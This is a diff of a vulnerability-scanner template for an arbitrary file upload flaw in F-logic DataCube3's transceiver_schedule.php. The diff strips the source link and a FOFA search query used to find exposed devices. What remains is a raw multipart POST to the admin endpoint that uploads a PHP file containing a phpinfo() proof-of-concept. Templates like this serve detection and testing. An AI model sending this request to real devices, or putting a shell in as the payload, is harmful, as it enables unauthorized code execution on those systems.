@@ -3,12 +3,8 @@ info:
   name: F-logic DataCube3 transceiver_schedule.php 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cba5uthhph6u9if1'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cba5uthhph6u9if1
-    fofa: title=="DataCube3"
 http:
 - raw:
   - 'POST /admin/transceiver_schedule.php?usb_schedule HTTP/1.1
@@ -35,8 +31,6 @@ http:
     Upgrade-Insecure-Requests: 1
 
 
-
-
     -----------------------------113389720123090127612523184396
 
 
@@ -44,8 +38,6 @@ http:
 
 
     Content-Type: image/jpeg
-
-
 
 
     <?php phpinfo();?>
